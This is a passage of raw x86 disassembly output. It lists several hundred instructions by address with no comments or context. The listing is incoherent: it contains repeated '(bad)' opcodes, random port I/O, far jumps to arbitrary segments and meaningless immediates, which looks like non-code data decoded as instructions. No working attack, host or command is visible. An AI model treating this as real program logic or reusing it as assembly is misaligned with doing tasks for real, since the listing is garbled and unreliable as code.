  41595b:	cmp    ch,BYTE PTR [edi+0x3c]
  41595e:	bound  esi,QWORD PTR [ebx-0x638367b]
  415964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415965:	mov    ds:0x720bc625,eax
  41596a:	ret    
  41596b:	sar    ah,cl
  41596d:	cmp    DWORD PTR [esi-0x24c784f2],edx
  415973:	test   BYTE PTR [edi],bl
  415975:	(bad)
  415978:	fwait
  415979:	test   eax,0x7a3d7b61
  41597e:	daa    
  41597f:	mov    esi,0xb10204dd
  415984:	or     al,BYTE PTR [ebp-0x407f9f7d]
  41598a:	cmp    edx,eax
  41598c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41598d:	push   edx
  41598e:	aad    0xd
  415990:	daa    
  415991:	test   ecx,0xbde7e7ae
  415997:	pop    eax
  415998:	or     al,0xcd
  41599a:	int    0x18
  41599c:	mov    al,0xcf
  41599e:	out    0xcb,eax
  4159a0:	jmp    0x41592c
  4159a2:	mov    ah,0x1d
  4159a4:	xor    DWORD PTR [edi-0x3723248e],ebx
  4159aa:	lahf   
  4159ab:	pop    eax
  4159ac:	sub    BYTE PTR [ebx],cl
  4159ae:	shr    DWORD PTR [ebp+0x68b1cac4],cl
  4159b4:	(bad)  
  4159b5:	out    0x8d,al
  4159b7:	push   0x1151cc55
  4159bc:	xlat   BYTE PTR ds:[ebx]
  4159bd:	rcl    BYTE PTR [edx+0x42ef10d],0xfc
  4159c4:	gs ss dec edi
  4159c7:	mov    eax,ds:0xf2bb84da
  4159cc:	xor    eax,0xbbacea6b
  4159d1:	mov    BYTE PTR [ecx],bh
  4159d3:	ds (bad) 
  4159d5:	mov    al,0x33
  4159d7:	xchg   edx,eax
  4159d8:	mov    es,WORD PTR [esp+edi*8+0x5814879a]
  4159df:	cli    
  4159e0:	adc    eax,0xdc0c5bfd
  4159e5:	test   DWORD PTR [esi+0x3],ebp
  4159e8:	call   0x340f:0x19bcd1fe
  4159ef:	aad    0x7c
  4159f1:	test   al,0x91
  4159f3:	sbb    eax,0x4ca1d1d2
  4159f8:	push   0xc33696d7
  4159fd:	les    eax,FWORD PTR [ebx-0x4d]
  415a00:	dec    edi
  415a01:	rcl    ah,cl
  415a03:	clc    
  415a04:	mov    al,ds:0x5423b481
  415a09:	xchg   edi,eax
  415a0a:	stc    
  415a0b:	(bad)  
  415a0c:	lock mov al,0x9b
  415a0f:	jmp    0x4642:0x51577a26
  415a16:	mov    ebx,0x4f1f8886
  415a1b:	push   ds
  415a1c:	xor    eax,0xd822ae34
  415a21:	cmp    eax,0x45543453
  415a26:	mov    al,ds:0xb227e73b
  415a2b:	inc    ebp
  415a2c:	xor    eax,0xb8711e90
  415a31:	mov    ds:0x78207698,eax
  415a36:	popf   
  415a37:	std    
  415a38:	xlat   BYTE PTR ds:[ebx]
  415a39:	mov    BYTE PTR [ecx+0x651b0eb1],bl
  415a3f:	pop    ebx
  415a40:	ret    
  415a41:	adc    eax,0x61d51a70
  415a46:	mov    ecx,0xc53591c5
  415a4b:	sar    al,cl
  415a4d:	push   0xf4742295
  415a52:	sub    BYTE PTR [ebp+0x3db37aa5],dh
  415a58:	mov    eax,ds:0x41f2b1c3
  415a5d:	sbb    eax,esp
  415a5f:	enter  0x4f93,0xbf
  415a63:	xlat   BYTE PTR ds:[ebx]
  415a64:	hlt    
  415a65:	in     eax,dx
  415a66:	push   ss
  415a67:	push   0x28
  415a69:	in     al,dx
  415a6a:	popa   
  415a6b:	mov    ebp,0xb7711c4
  415a70:	mov    esi,?
  415a72:	in     eax,dx
  415a73:	emms   
  415a75:	int3   
  415a76:	scas   eax,DWORD PTR es:[edi]
  415a77:	sub    DWORD PTR [edi+ebx*8-0x3a60d853],ebp
  415a7e:	inc    esi
  415a7f:	cmp    eax,edi
  415a81:	mov    edi,0x7517dce2
  415a86:	in     eax,dx
  415a87:	push   ebx
  415a88:	jg     0x415a40
  415a8a:	mov    WORD PTR [ebx-0x6e3d4c4d],ds
  415a90:	test   eax,0x1a3ed514
  415a95:	ins    BYTE PTR es:[edi],dx
  415a96:	xchg   ecx,eax
  415a97:	xor    eax,0xc618338a
  415a9c:	popa   
  415a9d:	call   esi
  415a9f:	retf   
  415aa0:	or     DWORD PTR [edx-0x3ed36389],ebp
  415aa6:	pusha  
  415aa7:	push   0xffffffd5
  415aa9:	sti    
  415aaa:	in     eax,0xb0
  415aac:	in     al,0x14
  415aae:	xchg   edx,eax
  415aaf:	add    ebp,DWORD PTR [edx]
  415ab1:	jg     0x415ab0
  415ab3:	jp     0x415b29
  415ab5:	jnp    0x415ae6
  415ab7:	push   eax
  415ab8:	or     BYTE PTR [edi+0x64ef9622],cl
  415abe:	push   es
  415abf:	xchg   ebx,eax
  415ac0:	loope  0x415b37
  415ac2:	loope  0x415ae7
  415ac4:	ss pop ebp
  415ac6:	jg     0x415aad
  415ac8:	jne    0x415a5b
  415aca:	xor    dl,BYTE PTR [edx]
  415acc:	cs add al,0x33
  415acf:	add    ebx,esi
  415ad1:	and    BYTE PTR [esi+0x4ff9cd5d],0xce
  415ad8:	inc    esp
  415ad9:	scas   al,BYTE PTR es:[edi]
  415ada:	bound  edx,QWORD PTR [ecx]
  415adc:	leave  
  415add:	imul   esi,DWORD PTR [edx+eiz*8+0x48],0xffffff84
  415ae2:	sub    DWORD PTR [edi-0x35],0x265487ae
  415ae9:	pop    ss
  415aea:	sbb    ebp,DWORD PTR [esi+0x57100381]
  415af0:	(bad)
  415af4:	jbe    0x415af3
  415af6:	inc    esp
  415af7:	das    
  415af8:	add    ebp,ebx
  415afa:	call   0xe7bc8a96
  415aff:	cmp    eax,0x18b3e55
  415b04:	mov    ds:0x405b6e67,al
  415b09:	outs   dx,DWORD PTR ds:[esi]
  415b0a:	out    dx,al
  415b0b:	and    cl,BYTE PTR [edx]
  415b0d:	call   0x967:0xa4dabdd0
  415b14:	std    
  415b15:	sbb    edi,DWORD PTR [eax-0x50f87890]
  415b1b:	mov    esp,0x8cd6a32d
  415b20:	test   BYTE PTR [edx+esi*8+0x42eea56f],ch
  415b27:	in     al,dx
  415b28:	(bad)  
  415b29:	sti    
  415b2a:	xchg   ebp,eax
  415b2b:	sub    ch,0x2e
  415b2e:	dec    edx
  415b2f:	mov    ecx,DWORD PTR [esi]
  415b31:	jnp    0x415b1b
  415b33:	sbb    al,0x3a
  415b35:	fmul   QWORD PTR ds:0x3aa565c3
  415b3b:	out    dx,eax
  415b3c:	rcl    BYTE PTR [edx+eax*2],1
  415b3f:	daa    
  415b40:	mov    esp,DWORD PTR ds:0x3fb63bd0
  415b46:	sahf   
  415b47:	add    eax,0x4fc3b1dc
  415b4c:	out    0x8f,eax
  415b4e:	cli    
  415b4f:	inc    edi
  415b50:	and    esi,esi
  415b52:	rcr    BYTE PTR [edi],0x5f
  415b55:	xchg   esp,eax
  415b56:	or     dh,ch
  415b58:	or     al,0xc0
  415b5a:	outs   dx,DWORD PTR ds:[esi]
  415b5b:	mov    ah,0xc
  415b5d:	nop
  415b5e:	in     al,dx
  415b5f:	not    cl
  415b61:	adc    BYTE PTR [ecx-0x20],ah
  415b64:	pop    es
  415b65:	and    DWORD PTR [bx+di],0xd
  415b69:	push   ecx
  415b6a:	jmp    0x415b9e
  415b6c:	in     eax,0x7a
  415b6e:	aam    0xb4
  415b70:	ins    DWORD PTR es:[edi],dx
  415b71:	test   eax,0xcded5b28
  415b76:	mov    al,ds:0x80f3c6b6
  415b7b:	mov    bl,0x4d
  415b7d:	mov    al,ds:0x49afdd27
  415b82:	int3   
  415b83:	out    0x4b,al
  415b85:	fisubr WORD PTR [ecx-0x60b3970a]
  415b8b:	xor    BYTE PTR [eax],dh
  415b8d:	cmp    BYTE PTR [ebp+eiz*1-0x199797b1],0xf
  415b95:	jle    0x415b9e
  415b97:	dec    esi
  415b98:	in     eax,dx
  415b99:	push   ebx
  415b9a:	dec    ecx
  415b9b:	loopne 0x415b76
  415b9d:	paddb  mm6,mm1
  415ba0:	(bad)  
  415ba1:	not    dh
  415ba3:	push   edx
  415ba4:	inc    esp
  415ba5:	mov    ds:0x720dbd99,eax
  415baa:	push   eax
  415bab:	fdiv   st,st(1)
  415bad:	xchg   esi,eax
  415bae:	(bad)  
  415baf:	push   esp
  415bb0:	sub    al,0x91
  415bb2:	xor    eax,0x5ef2df3b
  415bb7:	test   BYTE PTR [esi+ecx*1],ch
  415bba:	push   cs
  415bbb:	xchg   edi,eax
  415bbc:	mov    ds:0x1132f71,eax
  415bc1:	ror    DWORD PTR [ebp-0x50],0xfb
  415bc5:	shl    bh,1
  415bc7:	call   0xd3430175
  415bcc:	sub    al,BYTE PTR [ebx-0x73]
  415bcf:	sub    ch,BYTE PTR [esi-0x32]
  415bd2:	jmp    0x9a08:0x52e47566
  415bd9:	and    al,0x65
  415bdb:	mov    BYTE PTR [esi+0x49],bh
  415bde:	js     0x415c3f
  415be0:	push   edi
  415be1:	ins    BYTE PTR es:[edi],dx
  415be2:	pop    ecx
  415be3:	rcl    edi,0x68
  415be6:	mov    ds:0x1114b378,eax
  415beb:	pushf  
  415bec:	dec    eax
  415bed:	(bad)  
  415bee:	sub    al,0x1c
  415bf0:	sbb    BYTE PTR [eax-0x65bf16a8],bl
  415bf6:	nop    DWORD PTR ds:0xc517604f
  415bfd:	mul    BYTE PTR [edx+0x5002e8dd]
  415c03:	aad    0xb0
  415c05:	call   0x9078:0x1c52aa91
  415c0c:	lahf   
  415c0d:	jb     0x415c7e
  415c0f:	stos   DWORD PTR es:[edi],eax
  415c10:	jno    0x415bac
  415c12:	dec    esp
  415c13:	imul   ebx,DWORD PTR [esi],0xe0b4ddfd
  415c19:	xchg   edx,eax
  415c1a:	sar    DWORD PTR [eax-0x17aada5b],0x3
  415c21:	ja     0x415c6d
  415c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c24:	ror    BYTE PTR [edx-0x7105fe82],0xce
  415c2b:	mov    DWORD PTR [edx+0x70],edi
  415c2e:	push   ebp
  415c2f:	neg    DWORD PTR [ebx+0x5c]
  415c32:	sub    bl,ch
  415c34:	mov    ebp,DWORD PTR [eax+0xe]
  415c37:	or     dh,BYTE PTR [edi+0x68]
  415c3a:	lods   al,BYTE PTR ds:[esi]
  415c3b:	and    al,0xb8
  415c3d:	mov    edi,0x73f8f78c
  415c42:	(bad)  
  415c43:	xchg   edi,eax
  415c44:	das    
  415c45:	sub    DWORD PTR [ebx+0x4],ebx
  415c48:	test   al,0x34
  415c4a:	jp     0x415c7e
  415c4c:	stc    
  415c4d:	or     ah,ch
  415c4f:	fistp  WORD PTR ds:0x2d7cec9e
  415c55:	jp     0x415be1
  415c57:	stos   DWORD PTR es:[edi],eax
  415c58:	cmp    BYTE PTR [edx+ebp*2+0x60ed56b2],bh
  415c5f:	cmp    al,0xd0
  415c61:	mov    dh,0xf4
  415c63:	jmp    0xc812da41
  415c68:	push   0xffffffe5
  415c6a:	pushf  
  415c6b:	jno    0x415c1b
  415c6d:	fstp   QWORD PTR [ebp-0x65ebaf2b]
  415c73:	mov    DWORD PTR [ebx+eax*8],0xb38d8595
  415c7a:	cs enter 0x1ebd,0xf2
  415c7f:	sar    DWORD PTR [ecx-0x57729dda],0xf
  415c86:	aaa    
  415c87:	es jl  0x415ccc
  415c8a:	(bad)  
  415c8b:	data16 and ah,dh
  415c8e:	gs icebp 
  415c90:	mov    edx,0x57ec48fd
  415c95:	mov    ds:0x5fcfa7f7,al
  415c9a:	sub    DWORD PTR [edi-0x7d],eax
  415c9d:	fincstp 
  415c9f:	dec    ebp
  415ca0:	xchg   ebp,eax
  415ca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ca2:	pop    esp
  415ca3:	dec    ebx
  415ca4:	das    
  415ca5:	mov    eax,ds:0xfc73fb04
  415caa:	mov    cs,edi
  415cac:	mov    ebp,DWORD PTR [eax-0x63]
  415caf:	cmp    cl,BYTE PTR [ebp+edi*8+0x36b8bc38]
  415cb6:	mov    bh,0x35
  415cb8:	mov    ah,0xe5
  415cba:	mov    edx,0xd74e7a8d
  415cbf:	inc    eax
  415cc0:	and    al,0xa4
  415cc2:	mov    bh,0x21
  415cc4:	adc    al,0xdc
  415cc6:	jecxz  0x415cc5
  415cc8:	mov    ecx,0x4176f6e2
  415ccd:	dec    esp
  415cce:	fisubr DWORD PTR [ebp-0x48]
  415cd1:	sub    al,0xf4
  415cd3:	push   0xa
  415cd5:	stos   DWORD PTR es:[edi],eax
  415cd6:	mov    ecx,ebx
  415cd8:	or     eax,DWORD PTR [eax+0x6f]
  415cdb:	int3   
  415cdc:	mov    dl,0x4b
  415cde:	stc    
  415cdf:	pop    ebp
  415ce0:	mov    ds:0xd17baa8d,eax
  415ce5:	sub    bl,BYTE PTR [ebx-0x48]
  415ce8:	mov    DWORD PTR [edi],ebp
  415cea:	repnz call 0xa4a0:0x47aa5718
  415cf2:	push   es
  415cf3:	fcom   st(0)
  415cf5:	sbb    DWORD PTR [eax+0x8],0xffffffbb
  415cf9:	add    al,0x11
  415cfb:	cmp    BYTE PTR [edx-0x5001903],bl
  415d01:	inc    BYTE PTR [eax]
  415d03:	jl     0x415d1d
  415d05:	popa   
  415d06:	es sbb al,0x29
  415d09:	dec    esi
  415d0a:	and    dh,bh
  415d0c:	(bad)  
  415d0d:	fisub  WORD PTR [esi]
  415d0f:	adc    ch,0x14
  415d12:	sbb    al,ch
  415d14:	jmp    0xfd9e:0xbffc384
  415d1b:	leave  
  415d1c:	cmp    eax,0xbb482b69
  415d21:	dec    edi
  415d22:	mov    ah,0x17
  415d24:	shl    DWORD PTR es:[ebp-0x471b4196],0x18
  415d2c:	pop    eax
  415d2d:	jns    0x415cc2
  415d2f:	mov    ah,0x4d
  415d31:	mov    ch,0x48
  415d33:	pop    ss
  415d34:	ja     0x415d2c
  415d36:	call   0xfeb3:0x427dd6c4
  415d3d:	rcr    ebp,0xc
  415d40:	clc    
  415d41:	scas   al,BYTE PTR es:[edi]
  415d42:	push   cs
  415d43:	lods   eax,DWORD PTR ds:[si]
  415d45:	jb     0x415dae
  415d47:	lds    ebp,FWORD PTR [edi+0x3c55f56e]
  415d4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d4e:	or     BYTE PTR [esi],ah
  415d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d51:	shl    DWORD PTR [edx],cl
  415d53:	pop    esp
  415d54:	and    DWORD PTR [edi+0x39774fdc],ebp
  415d5a:	addr16 (bad) 
  415d5d:	jg     0x415d88
  415d5f:	loope  0x415dd1
  415d61:	push   0x469798c0
  415d66:	or     bh,BYTE PTR [ecx+edi*8-0x4fac5ec0]
  415d6d:	jae    0x415d95
  415d6f:	and    ebx,DWORD PTR [edx]
  415d71:	imul   DWORD PTR [edx-0x4df439b9]
  415d77:	and    al,0x12
  415d79:	mov    ds:0x79e0ba8a,al
  415d7e:	xchg   ecx,eax
  415d7f:	cmp    al,0xdf
  415d81:	inc    edx
  415d82:	je     0x5ab0f71b
  415d88:	push   gs
  415d8a:	adc    ebx,ecx
  415d8c:	sar    ah,0x1a
  415d8f:	hlt    
  415d90:	jns    0x415d8f
  415d92:	fild   QWORD PTR [edi]
  415d94:	adc    ebp,eax
  415d96:	jno    0x415dfb
  415d98:	cmp    ebx,ecx
  415d9a:	in     al,0x43
  415d9c:	test   ch,ch
  415d9e:	inc    ebx
  415d9f:	mov    ch,BYTE PTR [ebp+0x1a]
  415da2:	dec    edi
  415da3:	outs   dx,BYTE PTR ds:[esi]
  415da4:	jl     0x415d74
  415da6:	mov    esp,0x604c5e40
  415dab:	add    eax,0x2d018b4f
  415db0:	arpl   WORD PTR [ebp-0x46],si
  415db3:	call   0x57c5:0x884665fd
  415dba:	(bad)  
  415dbb:	in     al,0x15
  415dbd:	jae    0x415d54
  415dbf:	cmc    
  415dc0:	xlat   BYTE PTR ds:[ebx]
  415dc1:	xchg   ebx,eax
  415dc2:	xchg   al,dl
  415dc4:	cmp    ebp,DWORD PTR [ebp+0x7db9831c]
  415dca:	adc    al,0x1d
  415dcc:	cmp    al,0xf6
  415dce:	push   ebp
  415dcf:	push   ds
  415dd0:	and    eax,DWORD PTR [eax+0x47]
  415dd3:	or     al,0x3
  415dd5:	sti    
  415dd6:	push   ss
  415dd7:	dec    edi
  415dd8:	shr    DWORD PTR [ebp+0x30],cl
  415ddb:	ret    0x67bf
  415dde:	sub    ch,bh
  415de0:	push   cs
  415de1:	adc    al,0x7f
  415de3:	cs out 0xe3,eax
  415de6:	rcl    ebx,1
  415de8:	lahf   
  415de9:	fdiv   DWORD PTR [edx+0x62]
  415dec:	hlt    
  415ded:	xor    ecx,0x331a2162
  415df3:	call   0xdbbadd68
  415df8:	mov    eax,ds:0xbb8ecb3a
  415dfd:	jp     0x415ddf
  415dff:	fs mov ah,0x56
  415e02:	bound  ecx,QWORD PTR [eax+0x34]
  415e05:	pop    eax
  415e06:	mov    ds:0x8231b7e8,al
  415e0b:	cld    
  415e0c:	cmp    ecx,DWORD PTR [ecx+0x45002ca7]
  415e12:	cmp    al,dh
  415e14:	lods   eax,DWORD PTR ds:[esi]
  415e15:	hlt    
  415e16:	int    0xed
  415e18:	dec    edx
  415e19:	and    al,0x7d
  415e1b:	mov    dh,0x18
  415e1d:	(bad)  
  415e1f:	push   ebx
  415e20:	cmp    eax,0xea9a505b
  415e25:	fwait
  415e26:	xchg   esi,eax
  415e27:	jle    0x415ddf
  415e29:	stos   DWORD PTR es:[edi],eax
  415e2a:	pop    edx
  415e2b:	add    al,0xab
  415e2d:	xor    DWORD PTR [ecx-0xa],0xffffff81
  415e31:	loop   0x415e72
  415e33:	loope  0x415e5f
  415e35:	xor    edx,DWORD PTR [ebp+0xd]
  415e38:	inc    ecx
  415e39:	or     al,0x27
  415e3b:	fld    DWORD PTR [edi]
  415e3d:	dec    edx
  415e3e:	imul   ecx,DWORD PTR [ecx-0x75],0xe35563ab
  415e45:	pop    edx
  415e46:	or     dh,al
  415e48:	aas    
  415e49:	push   eax
  415e4a:	and    eax,0x5bbd54e4
  415e4f:	jns    0x415e6d
  415e51:	mov    eax,0xdd3131a8
  415e56:	lods   eax,DWORD PTR ds:[esi]
  415e57:	push   edi
  415e58:	push   es
  415e59:	test   ch,ch
  415e5b:	xor    edx,DWORD PTR [edi-0x61]
  415e5e:	lods   al,BYTE PTR ds:[esi]
  415e5f:	dec    esi
  415e60:	sub    edx,0x0
  415e63:	or     al,0x3f
  415e65:	push   ebp
  415e66:	mov    BYTE PTR [ecx-0x1e],cl
  415e69:	ss in  eax,dx
  415e6b:	lds    ebp,FWORD PTR [ebx]
  415e6d:	icebp  
  415e6e:	pop    ebp
  415e6f:	mov    edx,0x6690f7ea
  415e74:	in     al,0x8d
  415e76:	sar    BYTE PTR [esp+ebp*1-0x11f8ea49],cl
  415e7d:	and    eax,0x1ab142f2
  415e82:	xchg   BYTE PTR [edi-0x669369bc],ah
  415e88:	lahf   
  415e89:	test   al,ch
  415e8b:	cmp    edx,0xe67634fe
  415e91:	imul   ecx,DWORD PTR [ecx],0x95e6c598
  415e97:	and    al,al
  415e99:	and    al,0xfa
  415e9b:	adc    DWORD PTR ss:[edi+0x4bf97b4a],eax
  415ea2:	pop    eax
  415ea3:	inc    ebp
  415ea4:	sub    ecx,DWORD PTR [eax+0x4749aa29]
  415eaa:	in     al,dx
  415eab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eac:	or     DWORD PTR [ebp-0x3cb6c5fd],ebx
  415eb2:	push   edi
  415eb3:	mov    ebx,ss
  415eb5:	cmp    eax,0xbc467c36
  415eba:	pop    edi
  415ebb:	adc    eax,DWORD PTR [edx-0x73784e56]
  415ec1:	mov    dh,0x84
  415ec3:	cmp    eax,ebp
  415ec5:	pop    esi
  415ec6:	push   esp
  415ec7:	add    edi,esp
  415ec9:	pusha  
  415eca:	std    
  415ecb:	mov    ebx,0x99fd4500
  415ed0:	and    eax,0x615f0440
  415ed5:	dec    esi
  415ed6:	and    eax,0xd01cad87
  415edb:	ins    BYTE PTR es:[edi],dx
  415edc:	clc    
  415edd:	add    DWORD PTR [edx-0x24],edi
  415ee0:	out    dx,al
  415ee1:	sti    
  415ee2:	push   ds
  415ee3:	rcl    DWORD PTR [eax-0x56],cl
  415ee6:	les    esi,FWORD PTR [ebx]
  415ee8:	push   ds
  415ee9:	adc    DWORD PTR [esi+0x1e273f59],edx
  415eef:	cmp    al,0x6d
  415ef1:	and    BYTE PTR ds:0xafbaa6a9,dh
  415ef7:	loop   0x415f29
  415ef9:	mov    ebx,ecx
  415efb:	inc    ecx
  415efc:	outs   dx,BYTE PTR ds:[esi]
  415efd:	in     eax,dx
  415efe:	rcr    BYTE PTR [edi-0x60289b80],cl
  415f04:	icebp  
  415f05:	ins    DWORD PTR es:[edi],dx
  415f06:	ja     0x415efb
  415f08:	stc    
  415f09:	js     0x415ef3
  415f0b:	out    dx,eax
  415f0c:	in     eax,0x71
  415f0e:	cmp    edi,ebx
  415f10:	and    BYTE PTR [eax+0x626e6b3],0x7a
  415f17:	(bad)  
  415f18:	jbe    0x415ed1
  415f1a:	cwde   
  415f1b:	ja     0x415f1a
  415f1d:	dec    ebx
  415f1e:	mov    DWORD PTR ds:0x8960b53a,edx
  415f24:	jne    0x415f94
  415f26:	and    al,0x7f
  415f28:	dec    ebp
  415f29:	pop    es
  415f2a:	repnz pop es
  415f2c:	(bad)  
  415f2d:	sahf   
  415f2e:	sbb    BYTE PTR [ebx+0x7439dc83],0xb
  415f35:	mov    ds:0x5cf1f62e,eax
  415f3a:	dec    ebp
  415f3b:	xchg   BYTE PTR [eax+0x4a],bl
  415f3e:	sub    eax,0xae22f181
  415f43:	or     al,0x70
  415f45:	sar    BYTE PTR [edx+0x53],cl
  415f48:	mov    edi,0x52ba2373
  415f4d:	ja     0x415f74
  415f4f:	inc    ebp
  415f50:	repz sbb dl,BYTE PTR [ebp+0x58]
  415f54:	mov    dh,0x59
  415f56:	mov    al,0x84
  415f58:	jns    0x415fd5
  415f5a:	out    0xbc,al
  415f5c:	cmp    DWORD PTR [ebp+edi*8+0x19528258],edi
  415f63:	shr    DWORD PTR [esi],0xc7
  415f66:	test   ch,al
  415f68:	inc    ebx
  415f69:	mov    edx,0xc1b16811
  415f6e:	pop    esp
  415f6f:	xchg   edx,eax
  415f70:	lods   eax,DWORD PTR ds:[esi]
  415f71:	jecxz  0x415f32
  415f73:	cmp    ch,ah
  415f75:	pusha  
  415f76:	mov    bh,0xb2
  415f78:	and    DWORD PTR [esi],edi
  415f7a:	or     esp,eax
  415f7c:	add    edi,DWORD PTR [eax]
  415f7e:	ins    BYTE PTR es:[edi],dx
  415f7f:	xchg   ebx,eax
  415f80:	xor    al,BYTE PTR [eax]
  415f82:	push   esi
  415f83:	inc    ecx
  415f84:	mov    bh,0x1d
  415f86:	cmc    
  415f87:	or     eax,0xbdb63e70
  415f8c:	sbb    edx,DWORD PTR [edx-0x64d190e0]
  415f92:	mov    eax,0x263b3f5
  415f97:	pop    ebp
  415f98:	sub    BYTE PTR [edx],dh
  415f9a:	out    0x87,al
  415f9c:	dec    edx
  415f9d:	xchg   BYTE PTR [eax+0x4a9db438],ah
  415fa3:	and    DWORD PTR [eax-0x25],0xf35fb580
  415faa:	cmp    al,0xe0
  415fac:	jns    0x415f4b
  415fae:	mov    dl,0x84
  415fb0:	inc    ebx
  415fb1:	fs push 0xffffffa5
  415fb4:	out    0x82,eax
  415fb6:	or     eax,0x37b3e853
  415fbb:	es mov ah,0xcc
  415fbe:	ins    DWORD PTR es:[edi],dx
  415fbf:	aas    
  415fc0:	sbb    al,0xc1
  415fc2:	or     cl,bh
  415fc4:	leave  
  415fc5:	jb     0x415fb5
  415fc7:	inc    esi
  415fc8:	add    DWORD PTR [eax],0x8af8097a
  415fce:	imul   ebp,DWORD PTR [ebp-0x3d],0xeae6076d
  415fd5:	mov    dh,BYTE PTR [eax+0x51ac70b6]
  415fdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fdc:	jbe    0x41603c
  415fde:	mov    fs,ebx
  415fe0:	inc    ecx
  415fe1:	aas    
  415fe2:	mov    ds:0x1eddc21c,al
  415fe7:	and    eax,0x64f5b5f5
  415fec:	cmp    eax,DWORD PTR [edx+0x6e]
  415fef:	into   
  415ff0:	push   esi
  415ff1:	jp     0x416020
  415ff3:	(bad)  
  415ff4:	in     al,dx
  415ff5:	or     al,0x3
  415ff7:	jecxz  0x415f9d
  415ff9:	adc    DWORD PTR [ebx+0x530e56d8],edx
  415fff:	fcomp  DWORD PTR [edx]
  416001:	pop    esp
  416002:	leave  
  416003:	call   0xaa45:0x6b41515
  41600a:	inc    ebx
  41600b:	push   ecx
  41600c:	rcl    DWORD PTR [edi],0x57
  41600f:	imul   BYTE PTR [edi-0x5]
  416012:	aaa    
  416013:	mov    edi,0xc5f09a66
  416018:	out    dx,eax
  416019:	mov    WORD PTR [eax-0x2edc252b],ss
  41601f:	cld    
  416020:	push   cs
  416021:	test   al,0x64
  416023:	inc    edx
  416024:	iret   
  416025:	add    BYTE PTR [eax-0x39],ah
  416028:	gs sbb al,0x1f
  41602b:	stos   BYTE PTR es:[edi],al
  41602c:	loop   0x415ffc
  41602e:	xchg   esi,eax
  41602f:	xor    ebp,DWORD PTR [ebx+0x47834804]
  416035:	repz into 
  416037:	int    0x96
  416039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41603a:	(bad)  
  41603b:	xor    esp,ecx
  41603d:	dec    edi
  41603e:	lea    ebx,[eax-0x1b6de2d1]
  416044:	scas   eax,DWORD PTR es:[edi]
  416045:	xor    eax,0x8cee7eeb
  41604a:	cmc    
  41604b:	xchg   ah,cl
  41604d:	stos   DWORD PTR es:[edi],eax
  41604e:	and    eax,0xc4879105
  416053:	mov    ds:0xeafeb07,al
  416058:	aaa    
  416059:	mov    WORD PTR [ecx+0x16],ss
  41605c:	jb     0x416046
  41605e:	sbb    esp,ebp
  416060:	(bad)  
  416061:	cmp    ebx,edi
  416063:	(bad)  
  416064:	fwait
  416065:	int3   
  416066:	inc    edx
  416067:	leave  
  416068:	(bad)  
  416069:	jbe    0x416023
  41606b:	inc    ebp
  41606c:	hlt    
  41606d:	sub    al,0xed
  41606f:	sbb    al,0x90
  416071:	jmp    0x4160b9
  416073:	xchg   edx,eax
  416074:	inc    edx
  416075:	add    BYTE PTR [edx+0x1ed25ef6],bl
  41607b:	xor    DWORD PTR [ecx+0x29],ebp
  41607e:	fcmovu st,st(7)
  416080:	adc    al,0xe6
  416082:	cmc    
  416083:	ins    BYTE PTR es:[edi],dx
  416084:	mov    dl,0x7e
  416086:	dec    ecx
  416087:	into   
  416088:	fimul  WORD PTR [edx]
  41608a:	cmp    edx,DWORD PTR [edi+0x57]
  41608d:	out    dx,al
  41608e:	mov    cl,BYTE PTR [ebp-0x3934a0e5]
  416094:	mov    ebx,0xe2d812e2
  416099:	repz and ah,BYTE PTR [ecx]
  41609c:	pop    eax
  41609d:	out    dx,al
  41609e:	clc    
  41609f:	dec    esi
  4160a0:	pop    ebp
  4160a1:	clc    
  4160a2:	dec    edx
  4160a3:	sbb    bl,bh
  4160a5:	push   edi
  4160a6:	aas    
  4160a7:	test   DWORD PTR [edx],0x88fe926
  4160ad:	dec    esp
  4160ae:	cmp    BYTE PTR [ecx-0x7f],bh
  4160b1:	cdq    
  4160b2:	ds push ss
  4160b4:	pop    ss
  4160b5:	cmp    eax,0x39d20dc1
  4160ba:	add    esi,DWORD PTR [edi-0x3d]
  4160bd:	push   edx
  4160be:	jnp    0x416076
  4160c0:	fisub  WORD PTR [eax+esi*1+0x12]
  4160c4:	retf   
  4160c5:	xchg   ebx,eax
  4160c6:	xchg   ecx,eax
  4160c7:	out    dx,eax
  4160c8:	push   eax
  4160c9:	inc    esp
  4160ca:	jg     0x4160d1
  4160cc:	ins    DWORD PTR es:[edi],dx
  4160cd:	xchg   ecx,eax
  4160ce:	mov    cs,WORD PTR [ebx-0x6aa9d92b]
  4160d4:	pop    ebx
  4160d5:	shl    DWORD PTR [edi],cl
  4160d7:	add    DWORD PTR ds:0x70605d6b,esi
  4160dd:	dec    edx
  4160de:	jmp    0x631a:0x12c5a525
  4160e5:	sar    BYTE PTR [ebx+0x3b5b6f0d],cl
  4160eb:	cmp    eax,0x8953cd93
  4160f0:	sub    edx,DWORD PTR [esp+edx*8]
  4160f3:	aaa    
  4160f4:	mov    ecx,0x528c5ed1
  4160f9:	loopne 0x416091
  4160fb:	iret   
  4160fc:	ret    0x60da
  4160ff:	add    BYTE PTR [edi],bh
  416101:	pop    ecx
  416102:	add    ebp,ebx
  416104:	test   al,0x43
  416106:	aaa    
  416107:	stos   BYTE PTR es:[edi],al
  416108:	cs mov ch,0xb6
  41610b:	or     ah,dh
  41610d:	neg    dh
  41610f:	retf   0x1b4d
  416112:	add    eax,0x24b53896
  416117:	inc    ebx
  416118:	sbb    cl,BYTE PTR [edi]
  41611a:	jo     0x41615e
  41611c:	add    eax,edi
  41611e:	push   edi
  41611f:	daa    
  416120:	ja     0x416158
  416122:	jge    0x416156
  416124:	pop    ecx
  416125:	fiadd  DWORD PTR [edi]
  416127:	and    bh,BYTE PTR [ecx-0x2f47b572]
  41612d:	aam    0xf9
  41612f:	dec    esi
  416130:	ss xchg ebp,eax
  416132:	mov    esi,0xeb168a6
  416137:	sub    al,0x3d
  416139:	pand   mm1,mm4
  41613c:	jne    0x416160
  41613e:	pop    eax
  41613f:	into   
  416140:	loopne 0x416188
  416142:	or     eax,0xdbbb0d8
  416147:	push   ebp
  416148:	icebp  
  416149:	scas   al,BYTE PTR es:[edi]
  41614a:	fldl2e 
